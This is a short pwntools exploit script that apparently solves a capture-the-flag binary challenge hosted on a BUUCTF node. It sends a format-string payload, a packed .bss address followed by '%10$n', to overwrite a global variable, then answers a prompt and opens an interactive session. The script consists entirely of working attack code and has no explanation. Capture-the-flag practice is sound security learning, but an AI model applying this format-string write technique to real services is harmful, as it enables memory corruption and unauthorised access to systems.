from pwn import *

io = remote('node3.buuoj.cn',29260)

elf = ELF('./pwn1')
bss=0x804c044
payload = p32(bss)+b'%10$n'
io.sendline(payload)
io.recv()
io.sendline(str(4))
io.interactive()
